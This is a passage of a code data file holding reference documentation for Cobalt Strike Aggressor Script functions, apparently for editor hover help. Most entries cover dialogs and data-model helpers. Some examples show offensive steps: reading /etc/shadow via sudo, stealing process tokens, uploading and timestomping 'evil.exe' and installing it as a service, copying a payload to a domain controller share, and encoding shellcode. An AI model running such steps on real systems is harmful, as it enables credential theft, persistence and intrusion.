    documentation: `Ask Beacon to spawn an SSH session using the data from a key file. The key file needs to be in the PEM format. If the file is not in the PEM format then make a copy of the file and convert the copy with the following command:

/usr/bin/ssh-keygen -f [/path/to/copy] -e -m pem -p

**Arguments:**
- \`$1\` — id for the beacon. This may be an array or a single ID.
- \`$2\` — IP address or hostname of the target
- \`$3\` — port (e.g., 22)
- \`$4\` — username
- \`$5\` — key data (as a string)
- \`$6\` — (optional) the PID to inject the SSH client into or $null
- \`$7\` — (optional) the architecture of the target PID (x86|x64) or $null

**Example:**
\`\`\`
alias myssh {
$pid = $2;
$arch = $3;
$handle = openf("/path/to/key.pem");
$keydata = readb($handle, -1);
closef($handle);

if ($pid >= 0 && ($arch eq "x86" || $arch eq "x64")) {
bssh_key($1, "172.16.20.128", 22, "root", $keydata, $pid, $arch);
} else {
bssh_key($1, "172.16.20.128", 22, "root", $keydata);
}
};
\`\`\``,
    anchors: ["bssh_key"],
  },
  "bstage": {
    name: "bstage",
    detail: "REMOVED This function is removed in Cobalt Strike 4",
    documentation: `REMOVED This function is removed in Cobalt Strike 4.0. Use &beacon_stage_tcp or &beacon_stage_pipe to explicitly stage a payload. Use &beacon_link to link to it.`,
    anchors: ["bstage"],
  },
  "bsteal_token": {
    name: "bsteal_token",
    detail: "bsteal_token($1, $2)",
    documentation: `Ask Beacon to steal a token from a process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID to take the token from

**Example:**
\`\`\`
alias steal_token {
bsteal_token($1, int($2));
}
\`\`\``,
    anchors: ["bsteal_token"],
  },
  "bsudo": {
    name: "bsudo",
    detail: "bsudo($1, $2, $3)",
    documentation: `Ask Beacon to run a command via sudo (SSH sessions only)

**Arguments:**
- \`$1\` — the id for the session. This may be an array or a single ID.
- \`$2\` — the password for the current user
- \`$3\` — the command and arguments to run

**Example:**
\`\`\`
# hashdump [password]
ssh_alias hashdump {
bsudo($1, $2, "cat /etc/shadow");
}
\`\`\``,
    anchors: ["bsudo"],
  },
  "bsyscall_method": {
    name: "bsyscall_method",
    detail: "bsyscall_method($1, $2)",
    documentation: `Ask Beacon to change its syscall method.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the syscall method. Supported methods are:

**Example:**
\`\`\`
alias syscall_method {
bsyscall_method($1, $2);
}
\`\`\``,
    anchors: ["bsyscall_method"],
  },
  "btask": {
    name: "btask",
    detail: "btask($1, $2, $3)",
    documentation: `Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.

**Arguments:**
- \`$1\` — the id for the beacon to post to
- \`$2\` — the text to post
- \`$3\` — a string with MITRE ATT&CK Tactic IDs. Use a comma and a space to specify multiple IDs in one string.

**Example:**
\`\`\`
alias foo {
btask($1, "User tasked beacon to foo", "T1015");
}
\`\`\``,
    anchors: ["btask"],
  },
  "btimestomp": {
    name: "btimestomp",
    detail: "btimestomp($1, $2, $3)",
    documentation: `Ask Beacon to change the file modified/accessed/created times to match another file.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the file to update timestamp values for
- \`$3\` — the file to grab timestamp values from

**Example:**
\`\`\`
alias persist {
bcd($1, "c:\\\\windows\\\\system32");
bupload($1, script_resource("evil.exe"));
btimestomp($1, "evil.exe", "cmd.exe");
bshell($1, 'sc create evil binpath= "c:\\\\windows\\\\system32\\\\evil.exe"');
bshell($1, 'sc start evil');
}
\`\`\``,
    anchors: ["btimestomp"],
  },
  "btoken_store_remove": {
    name: "btoken_store_remove",
    detail: "btoken_store_remove($1, $2)",
    documentation: `Ask Beacon to remove specific access tokens from the store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the array of token IDs to remove.

**Example:**
\`\`\`
alias token-store_remove {
btoken_store_remove($1, @(int($2)));
}
\`\`\``,
    anchors: ["btoken_store_remove"],
  },
  "btoken_store_remove_all": {
    name: "btoken_store_remove_all",
    detail: "btoken_store_remove_all($1)",
    documentation: `Ask Beacon to remove all tokens from the store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias token-store_remove_all {
btoken_store_remove_all($1);
}
\`\`\``,
    anchors: ["btoken_store_remove_all"],
  },
  "btoken_store_show": {
    name: "btoken_store_show",
    detail: "btoken_store_show($1)",
    documentation: `Ask Beacon to print the tokens currently available in the token store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias token-store_show {
btoken_store_show($1);
}
\`\`\``,
    anchors: ["btoken_store_show"],
  },
  "btoken_store_steal": {
    name: "btoken_store_steal",
    detail: "btoken_store_steal($1, $2, $3)",
    documentation: `Ask Beacon to steal a token and store it in the token store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the array of PIDs to take the tokens from.
- \`$3\` — the OpenProcessToken access mask.

**Example:**
\`\`\`
alias token-store_steal {
btoken_store_steal($1, @(int($2)), 11);
}
\`\`\``,
    anchors: ["btoken_store_steal"],
  },
  "btoken_store_steal-use": {
    name: "btoken_store_steal-use",
    detail: "btoken_store_steal-use($1, $2, $3)",
    documentation: `Ask Beacon to steal a token, store it and immediately apply it to the beacon.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID to take the token from.
- \`$3\` — the OpenProcessToken access mask.

**Example:**
\`\`\`
alias token-store_steal_and_use {
btoken_store_steal_and_use($1, int($2), 11);
}
\`\`\``,
    anchors: ["btoken_store_steal-use"],
  },
  "btoken_store_use": {
    name: "btoken_store_use",
    detail: "btoken_store_use($1, $2)",
    documentation: `Ask Beacon to use a token from the token store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the token ID.

**Example:**
\`\`\`
alias token-store_use {
btoken_store_use($1, int($2));
}
\`\`\``,
    anchors: ["btoken_store_use"],
  },
  "bunlink": {
    name: "bunlink",
    detail: "bunlink($1, $2, $3)",
    documentation: `Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the target host to unlink (specified as an IP address)
- \`$3\` — (optional) the PID of the target session to unlink

**Example:**
\`\`\`
bunlink($1, "172.16.48.3");
\`\`\``,
    anchors: ["bunlink"],
  },
  "bupload": {
    name: "bupload",
    detail: "bupload($1, $2)",
    documentation: `Ask a Beacon to upload a file

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the local path to the file to upload

**Example:**
\`\`\`
bupload($1, script_resource("evil.exe"));
\`\`\``,
    anchors: ["bupload"],
  },
  "bupload_raw": {
    name: "bupload_raw",
    detail: "bupload_raw($1, $2, $3, $4)",
    documentation: `Ask a Beacon to upload a file

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the remote file name of the file
- \`$3\` — the raw content of the file
- \`$4\` — (optional) the local path to the file (if there is one)

**Example:**
\`\`\`
$data = artifact("my-listener", "exe");
bupload_raw($1, "\\\\\\\\DC\\\\C$\\\\foo.exe", $data);
\`\`\``,
    anchors: ["bupload_raw"],
  },
  "bwdigest": {
    name: "bwdigest",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.0. Use &bmimikatz directly.`,
    anchors: ["bwdigest"],
  },
  "bwinrm": {
    name: "bwinrm",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.0. Use &bjump with winrm or winrm64 built-in options.`,
    anchors: ["bwinrm"],
  },
  "bwmi": {
    name: "bwmi",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.0.`,
    anchors: ["bwmi"],
  },
  "call": {
    name: "call",
    detail: "call($1, $2)",
    documentation: `Issue a call to the team server.

**Arguments:**
- \`$1\` — the command name
- \`$2\` — a callback to receive a response to this request. The callback will receive two arguments. The first is the call name. The second is the response.

**Example:**
\`\`\`
call("aggressor.ping", { warn(@_); }, "this is my value");
\`\`\``,
    anchors: ["call"],
  },
  "closeClient": {
    name: "closeClient",
    detail: "Close the current Cobalt Strike team server connection",
    documentation: `Close the current Cobalt Strike team server connection.

**Example:**
\`\`\`
closeClient();
\`\`\``,
    anchors: ["closeClient"],
  },
  "colorMenu": {
    name: "colorMenu",
    detail: "colorMenu($1, $2)",
    documentation: `Generate a Java Menu color selection component to set accent colors within Cobalt Strike's data model

**Arguments:**
- \`$1\` — the prefix
- \`$2\` — an array of IDs to change colors for

**Example:**
\`\`\`
popup targets {
menu "&Color" {
insert_color_menu(colorMenu("targets", $1));
}
}

See also

&highlight
\`\`\``,
    anchors: ["colorMenu"],
  },
  "credential_add": {
    name: "credential_add",
    detail: "credential_add($1, $2, $3, $4, $5)",
    documentation: `Add a credential to the data model

**Arguments:**
- \`$1\` — username
- \`$2\` — password
- \`$3\` — realm
- \`$4\` — source
- \`$5\` — host

**Example:**
\`\`\`
command falsecreds {
for ($x = 0; $x < 100; $x++) {
credential_add("user $+ $x", "password $+ $x");
}
}
\`\`\``,
    anchors: ["credential_add"],
  },
  "credentials": {
    name: "credentials",
    detail: "Returns a list of application credentials in Cobalt Strike's data model",
    documentation: `Returns a list of application credentials in Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about each credential entry.

**Example:**
\`\`\`
printAll(credentials());
\`\`\``,
    anchors: ["credentials"],
  },
  "custom_event": {
    name: "custom_event",
    detail: "custom_event($1, $2)",
    documentation: `Broadcast a custom event to all Cobalt Strike clients.

**Arguments:**
- \`$1\` — the topic name
- \`$2\` — the event data

**Example:**
\`\`\`
custom_event("my-topic", %(foo => 42, bar => "hello"));
\`\`\``,
    anchors: ["custom_event"],
  },
  "custom_event_private": {
    name: "custom_event_private",
    detail: "custom_event_private($1, $2, $3)",
    documentation: `Send a custom event to one specific Cobalt Strike client.

**Arguments:**
- \`$1\` — who to send the custom event to
- \`$2\` — the topic name
- \`$3\` — the event data

**Example:**
\`\`\`
custom_event_private("neo", "my-topic", 42);
\`\`\``,
    anchors: ["custom_event_private"],
  },
  "data_keys": {
    name: "data_keys",
    detail: "List the query-able keys from Cobalt Strike's data model",
    documentation: `List the query-able keys from Cobalt Strike's data model

**Returns:** A list of keys that you may query with &data_query

**Example:**
\`\`\`
foreach $key (data_keys()) {
println("\\n\\c4=== $key ===\\n");
println(data_query($key));
}
\`\`\``,
    anchors: ["data_keys"],
  },
  "data_query": {
    name: "data_query",
    detail: "data_query($1)",
    documentation: `Queries Cobalt Strike's data model

**Arguments:**
- \`$1\` — the key to pull from the data model

**Returns:** A Sleep representation of the queried data.

**Example:**
\`\`\`
println(data_query("targets"));
\`\`\``,
    anchors: ["data_query"],
  },
  "dbutton_action": {
    name: "dbutton_action",
    detail: "dbutton_action($1, $2)",
    documentation: `Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.

**Arguments:**
- \`$1\` — the $dialog object
- \`$2\` — the button label

**Example:**
\`\`\`
dbutton_action($dialog, "Start");
dbutton_action($dialog, "Stop");
\`\`\``,
    anchors: ["dbutton_action"],
  },
  "dbutton_help": {
    name: "dbutton_help",
    detail: "dbutton_help($1, $2)",
    documentation: `Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.

**Arguments:**
- \`$1\` — the $dialog object
- \`$2\` — the URL to go to

**Example:**
\`\`\`
dbutton_help($dialog, "http://www.google.com");
\`\`\``,
    anchors: ["dbutton_help"],
  },
  "dialog": {
    name: "dialog",
    detail: "dialog($1, $2, $3)",
    documentation: `Create a dialog. Use &dialog_show to show it.

**Arguments:**
- \`$1\` — the title of the dialog
- \`$2\` — a %dictionary mapping row names to default values
- \`$3\` — a callback function. Called when the user presses a &dbutton_action button. $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.

**Returns:** A scalar with a $dialog object.

**Example:**
\`\`\`
sub callback {
# prints: Pressed Go, a is: Apple
println("Pressed $2 $+ , a is: " . $3['a']);
}

$dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
drow_text($dialog, "a", "Fruit: ");
drow_text($dialog, "b", "Rodent: ");
dbutton_action($dialog, "Go");
dialog_show($dialog);
\`\`\``,
    anchors: ["dialog"],
  },
  "dialog_description": {
    name: "dialog_description",
    detail: "dialog_description($1, $2, $3)",
    documentation: `Adds a description to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the description of this dialog
- \`$3\` — (optional) the number of lines of text to show for the description of this dialog. When it is not specified two lines of text are shown for the description of this dialog. The maximum number of lines that can be shown is 20.

**Example:**
\`\`\`
dialog_description($dialog, "I am the Hello World dialog.");

dialog_description($dialog, "I am the Hello World dialog.", 2);
\`\`\``,
    anchors: ["dialog_description"],
  },
  "dialog_show": {
    name: "dialog_show",
    detail: "dialog_show($1)",
    documentation: `Shows a &dialog.

**Arguments:**
- \`$1\` — the $dialog object

**Example:**
\`\`\`
dialog_show($dialog);
\`\`\``,
    anchors: ["dialog_show"],
  },
  "dispatch_event": {
    name: "dispatch_event",
    detail: "dispatch_event($1)",
    documentation: `Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.

**Arguments:**
- \`$1\` — the function to call

**Example:**
\`\`\`
dispatch_event({
println("Hello World"); 
});
\`\`\``,
    anchors: ["dispatch_event"],
  },
  "downloads": {
    name: "downloads",
    detail: "Returns a list of downloads in Cobalt Strike's data model",
    documentation: `Returns a list of downloads in Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about each downloaded file.

**Example:**
\`\`\`
printAll(downloads());
\`\`\``,
    anchors: ["downloads"],
  },
  "drow_beacon": {
    name: "drow_beacon",
    detail: "drow_beacon($1, $2, $3)",
    documentation: `Adds a beacon selection row to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_beacon($dialog, "bid", "Session: ");
\`\`\``,
    anchors: ["drow_beacon"],
  },
  "drow_checkbox": {
    name: "drow_checkbox",
    detail: "drow_checkbox($1, $2, $3, $4)",
    documentation: `Adds a checkbox to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row
- \`$4\` — the text next to the checkbox

**Example:**
\`\`\`
drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
\`\`\``,
    anchors: ["drow_checkbox"],
  },
  "drow_combobox": {
    name: "drow_combobox",
    detail: "drow_combobox($1, $2, $3, $4)",
    documentation: `Adds a combobox to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row
- \`$4\` — an array of options to choose from

**Example:**
\`\`\`
drow_combobox($dialog, "combo", "Options", @("apple", "bat", "cat"));
\`\`\``,
    anchors: ["drow_combobox"],
  },
  "drow_exploits": {
    name: "drow_exploits",
    detail: "drow_exploits($1, $2, $3)",
    documentation: `Adds a privilege escalation exploit selection row to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_exploits($dialog, "exploit", "Exploit: ");
\`\`\``,
    anchors: ["drow_exploits"],
  },
  "drow_file": {
    name: "drow_file",
    detail: "drow_file($1, $2, $3)",
    documentation: `Adds a file chooser row to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_file($dialog, "file", "Choose: ");
\`\`\``,
    anchors: ["drow_file"],
  },
  "drow_interface": {
    name: "drow_interface",
    detail: "drow_interface($1, $2, $3)",
    documentation: `Adds a VPN interface selection row to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_interface($dialog, "int", "Interface: ");
\`\`\``,
    anchors: ["drow_interface"],
  },
  "drow_krbtgt": {
    name: "drow_krbtgt",
    detail: "drow_krbtgt($1, $2, $3)",
    documentation: `Adds a krbtgt selection row to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_krbtgt($dialog, "hash", "krbtgt hash: ");
\`\`\``,
    anchors: ["drow_krbtgt"],
  },
  "drow_listener": {
    name: "drow_listener",
    detail: "drow_listener($1, $2, $3)",
    documentation: `Adds a listener selection row to a &dialog. This row only shows listeners with stagers (e.g., windows/beacon_https/reverse_https).

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_listener($dialog, "listener", "Listener: ");
\`\`\``,
    anchors: ["drow_listener"],
  },
  "drow_listener_smb": {
    name: "drow_listener_smb",
    detail: "DEPRECATED This function is deprecated in Cobalt Strike 4",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. It's now equivalent to &drow_listener_stage`,
    anchors: ["drow_listener_smb"],
  },
  "drow_listener_stage": {
    name: "drow_listener_stage",
    detail: "drow_listener_stage($1, $2, $3)",
    documentation: `Adds a listener selection row to a &dialog. This row shows all Beacon and Foreign listener payloads.

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_listener_stage($dialog, "listener", "Stage: ");
\`\`\``,
    anchors: ["drow_listener_stage"],
  },
  "drow_mailserver": {
    name: "drow_mailserver",
    detail: "drow_mailserver($1, $2, $3)",
    documentation: `Adds a mail server field to a &dialog.

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_mailserver($dialog, "mail", "SMTP Server: ");
\`\`\``,
    anchors: ["drow_mailserver"],
  },
  "drow_proxyserver": {
    name: "drow_proxyserver",
    detail: "drow_proxyserver($1, $2, $3)",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. The proxy configuration is now tied directly to the listener.

Adds a proxy server field to a &dialog.

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_proxyserver($dialog, "proxy", "Proxy: ");
\`\`\``,
    anchors: ["drow_proxyserver"],
  },
  "drow_site": {
    name: "drow_site",
    detail: "drow_site($1, $2, $3)",
    documentation: `Adds a site/URL field to a &dialog.

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_site($dialog, "url", "Site: ");
\`\`\``,
    anchors: ["drow_site"],
  },
  "drow_text": {
    name: "drow_text",
    detail: "drow_text($1, $2, $3, $4)",
    documentation: `Adds a text field row to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row
- \`$4\` — (optional) The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider).

**Example:**
\`\`\`
drow_text($dialog, "name", "Name: ");
\`\`\``,
    anchors: ["drow_text"],
  },
  "drow_text_big": {
    name: "drow_text_big",
    detail: "drow_text_big($1, $2, $3)",
    documentation: `Adds a multi-line text field to a &dialog

**Arguments:**
- \`$1\` — a $dialog object
- \`$2\` — the name of this row
- \`$3\` — the label for this row

**Example:**
\`\`\`
drow_text_big($dialog, "addr", "Address: ");
\`\`\``,
    anchors: ["drow_text_big"],
  },
  "dstamp": {
    name: "dstamp",
    detail: "dstamp($1)",
    documentation: `Format a time into a date/time value. This value includes seconds.

**Arguments:**
- \`$1\` — the time [milliseconds since the UNIX epoch]

**Example:**
\`\`\`
println("The time is now: " . dstamp(ticks()));

See also

&tstamp
\`\`\``,
    anchors: ["dstamp"],
  },
  "elog": {
    name: "elog",
    detail: "elog($1)",
    documentation: `Publish a notification to the event log

**Arguments:**
- \`$1\` — the message

**Example:**
\`\`\`
elog("The robot invasion has begun!");
\`\`\``,
    anchors: ["elog"],
  },
  "encode": {
    name: "encode",
    detail: "encode($1, $2, $3)",
    documentation: `Obfuscate a position-independent blob of code with an encoder.

**Arguments:**
- \`$1\` — position independent code (e.g., shellcode, "raw" stageless Beacon) to apply encoder to
- \`$2\` — the encoder to use
- \`$3\` — the architecture (e.g., x86, x64)

**Returns:** A position-independent blob that decodes the original string and passes execution to it.

**Note:** - The encoded position-independent blob must run from a memory page that has RWX permissions or the decode step will crash the current process.

- alpha encoder: The EDI register must contain the address of the encoded blob. &encode prepends a 10-byte (non-alphanumeric) program to the beginning of t

**Example:**
\`\`\`
# generate shellcode for a listener
$stager = shellcode("my-listener", false "x86");

# encode it.
$stager = encode($stager, "xor", "x86");
\`\`\``,
    anchors: ["encode"],
  },
  "extract_reflective_loader": {
    name: "extract_reflective_loader",
    detail: "extract_reflective_loader($1)",
    documentation: `DEPRECATED This hook is no longer needed as the stomp loader style reflective loader is no longer supported.

Extract the executable code for a reflective loader from a Beacon Object File (BOF).

**Arguments:**
- \`$1\` — Beacon Object File data that contains a reflective loader.

**Returns:** The Reflective Loader binary executable code extracted from the Beacon Object File data.

**Example:**
\`\`\`
See BEACON_RDLL_GENERATE hook

# ---------------------------------------------------------------------
# extract loader from BOF.
# ---------------------------------------------------------------------
$loader = extract_reflective_loader($data);
\`\`\``,
    anchors: ["extract_reflective_loader"],
  },
  "file_browser": {
    name: "file_browser",
    detail: "Open the File Browser",
    documentation: `Open the File Browser. This function does not have any parameters.`,
    anchors: ["file_browser"],
  },
  "fireAlias": {
    name: "fireAlias",
    detail: "fireAlias($1, $2, $3)",
    documentation: `Runs a user-defined alias

**Arguments:**
- \`$1\` — the beacon id to run the alias against
- \`$2\` — the alias name to run
- \`$3\` — the arguments to pass to the alias.

**Example:**
\`\`\`
# run the foo alias when a new Beacon comes in
on beacon_initial {
fireAlias($1, "foo", "bar!");
}
\`\`\``,
    anchors: ["fireAlias"],
  },
  "fireEvent": {
    name: "fireEvent",
    detail: "fireEvent($1)",
    documentation: `Fire an event.

**Arguments:**
- \`$1\` — the event name

**Example:**
\`\`\`
on foo {
println("Argument is: $1");
}

fireEvent("foo", "Hello World!");
\`\`\``,
    anchors: ["fireEvent"],
  },
  "format_size": {
    name: "format_size",
    detail: "format_size($1)",
    documentation: `Formats a number into a size (e.g., 1024 => 1kb)

**Arguments:**
- \`$1\` — the size to format

**Returns:** A string representing a human readable data size.

**Example:**
\`\`\`
println(format_size(1024));
\`\`\``,
    anchors: ["format_size"],
  },
  "getAggressorClient": {
    name: "getAggressorClient",
    detail: "Returns the aggressor",
    documentation: `Returns the aggressor.AggressorClient Java object. This can reach anything internal within the current Cobalt Strike client context.

**Example:**
\`\`\`
$client = getAggressorClient();
\`\`\``,
    anchors: ["getAggressorClient"],
  },
  "getAggressorClientType": {
    name: "getAggressorClientType",
    detail: "Returns the type of client that is executing the current script",
    documentation: `Returns the type of client that is executing the current script. This function is useful when sharing a script between different client types but you want to limit some capabilities in the script to a particular client type. For example, UI elements should only be executed for the ui client type.

**Returns:** One of the following strings will be returned:

ui - Returned when the Cobalt Strike UI client is executing the script.

headless - Returned when the Headless Cobalt Strike client is executing the script.

restapi - Returned when the Cobalt Strike Rest API service is executing the script.

Examples

Print the aggressor client type that is executing this code.

println("The aggressor client type is set to: " . getAggressorClientType());

Use in a CNA script to help control behavior when it is executed by any of the client types.

# Use in a CNA script that may be used by any of the client types.
if (getAggressorClientType() eq "ui") {
show_message("I am a UI client, safe to show dialog boxes.");
} else {
println("I am not a UI client, print message to stdout.");
}`,
    anchors: ["getAggressorClientType"],
  },
  "getpostexkit": {
    name: "getpostexkit",
    detail: "Returns the id constant for the PostEx kit message type",
    documentation: `Returns the id constant for the PostEx kit message type.

See also

&beacon_execute_postex_job

Postex Kit`,
    anchors: ["getpostexkit"],
  },
  "gunzip": {
    name: "gunzip",
    detail: "gunzip($1)",
    documentation: `Decompress a string (GZIP).

**Arguments:**
- \`$1\` — the string to compress

**Returns:** The argument processed by the gzip de-compressor

**Example:**
\`\`\`
println(gunzip(gzip("this is a test")));

See also

&gzip
\`\`\``,
    anchors: ["gunzip"],
  },
  "gzip": {
    name: "gzip",
    detail: "gzip($1)",
    documentation: `GZIP a string.

**Arguments:**
- \`$1\` — the string to compress

**Returns:** The argument processed by the gzip compressor

**Example:**
\`\`\`
println(gzip("this is a test"));

See also

&gunzip
\`\`\``,
    anchors: ["gzip"],
  },
  "highlight": {
    name: "highlight",
    detail: "highlight($1, $2, $3)",
    documentation: `Insert an accent (color highlight) into Cobalt Strike's data model

**Arguments:**
- \`$1\` — the data model
- \`$2\` — an array of rows to highlight
- \`$3\` — the accent type

**Note:** - Data model rows include: applications, beacons, credentials, listeners, services, and targets.

- Accent options are:

Accent
Color

[empty]
no highlight

good
Green

bad
Red

neutral
Yellow

ignore
Grey

cancel
Dark Blue

**Example:**
\`\`\`
command admincreds {
local('@creds');

# find all of our creds that are user Administrator.
foreach $entry (credentials()) {
if ($entry['user'] eq "Administrator") {
push(@creds, $entry);
}
}

# highlight all of them green!
highlight("credentials", @creds, "good");
}
\`\`\``,
    anchors: ["highlight"],
  },
  "host_delete": {
    name: "host_delete",
    detail: "host_delete($1)",
    documentation: `Delete a host from the targets model

**Arguments:**
- \`$1\` — the IPv4 or IPv6 address of this target [you may specify an array of hosts too]

**Example:**
\`\`\`
# clear all hosts
host_delete(hosts());
\`\`\``,
    anchors: ["host_delete"],
  },
  "host_info": {
    name: "host_info",
    detail: "host_info($1, $2)",
    documentation: `Get information about a target.

**Arguments:**
- \`$1\` — the host IPv4 or IPv6 address
- \`$2\` — [Optional] the key to extract a value for

**Returns:** %info = host_info("address");

Returns a dictionary with known information about this target.

$value = host_info("address", "key");

Returns the value for the specified key from this target's entry in the data model.

**Example:**
\`\`\`
# create a script console alias to dump host info
command host {
println("Host $1");
foreach $key => $value (host_info($1)) {
println("$[15]key $value");
}
}
\`\`\``,
    anchors: ["host_info"],
  },
  "host_update": {
    name: "host_update",
    detail: "host_update($1, $2, $3, $4, $5)",
    documentation: `Add or update a host in the targets model

**Arguments:**
- \`$1\` — the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
- \`$2\` — the DNS name of this target
- \`$3\` — the target's operating system
- \`$4\` — the operating system version number (e.g., 10.0)
- \`$5\` — a note for the target.

**Note:** You may specify a $null value for any argument and, if the host exists, no change will be made to that value.

**Example:**
\`\`\`
host_update("192.168.20.3", "DC", "Windows", 10.0);
\`\`\``,
    anchors: ["host_update"],
  },
  "hosts": {
    name: "hosts",
    detail: "Returns a list of IP addresses from Cobalt Strike's target model",
    documentation: `Returns a list of IP addresses from Cobalt Strike's target model

**Returns:** An array of IP addresses

**Example:**
\`\`\`
printAll(hosts());
\`\`\``,
    anchors: ["hosts"],
  },
  "insert_color_menu": {
    name: "insert_color_menu",
    detail: "insert_color_menu($1)",
    documentation: `Add a color selection menu to a menu tree

**Arguments:**
- \`$1\` — the color menu component to add

**Example:**
\`\`\`
popup targets {
menu "&Color" {
insert_color_menu(colorMenu("targets", $1));
}
}

See also

&highlight
\`\`\``,
    anchors: ["insert_color_menu"],
  },
  "insert_component": {
    name: "insert_component",
    detail: "insert_component($1)",
    documentation: `Add a javax.swing.JComponent object to the menu tree

**Arguments:**
- \`$1\` — the component to add`,
    anchors: ["insert_component"],
  },
  "insert_menu": {
    name: "insert_menu",
    detail: "insert_menu($1)",
    documentation: `Bring menus associated with a popup hook into the current menu tree.

**Arguments:**
- \`$1\` — the popup hook

**Example:**
\`\`\`
popup beacon {
# menu definitions above this point

insert_menu("beacon_bottom", $1);

# menu definitions below this point
}
\`\`\``,
    anchors: ["insert_menu"],
  },
  "iprange": {
    name: "iprange",
    detail: "iprange($1)",
    documentation: `Generate an array of IPv4 addresses based on a string description

**Arguments:**
- \`$1\` — a string with a description of IPv4 ranges

**Returns:** An array of IPv4 addresses within the specified ranges.

**Example:**
\`\`\`
printAll(iprange("192.168.1.0/25"));
\`\`\``,
    anchors: ["iprange"],
  },
  "keystrokes": {
    name: "keystrokes",
    detail: "Returns a list of keystrokes from Cobalt Strike's data model",
    documentation: `Returns a list of keystrokes from Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about recorded keystrokes.

**Example:**
\`\`\`
printAll(keystrokes());
\`\`\``,
    anchors: ["keystrokes"],
  },
  "killdate": {
    name: "killdate",
    detail: "Get the Beacon kill date configured on the teamserver",
    documentation: `Get the Beacon kill date configured on the teamserver.

**Returns:** A string with the teamserver's kill date in the format “YYYY-MM-DD” (where 

YYYY is year, 
MM is month and 
DD is the day).

For example, a returned value of 2024-07-05 is the date 5 July 2024.

NOTE: 

A kill date is optional. If a teamserver does not have a kill date set then an empty string is returned.

**Example:**
\`\`\`
println("Kill date: " . killdate());
\`\`\``,
    anchors: ["killdate"],
  },
  "listener_create": {
    name: "listener_create",
    detail: "listener_create($1, $2, $3, $4, $5)",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &listener_create_ext

Create a new listener.

**Arguments:**
- \`$1\` — the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.).
- \`$2\` — the payload (e.g., windows/beacon_http/reverse_http)
- \`$3\` — the listener host
- \`$4\` — the listener port
- \`$5\` — a comma separated list of addresses for listener to beacon to

**Example:**
\`\`\`
# create a foreign listener
listener_create("My-Metasploit", "windows/foreign_https/reverse_https", 
"ads.losenolove.com", 443);

# create an HTTP Beacon listener
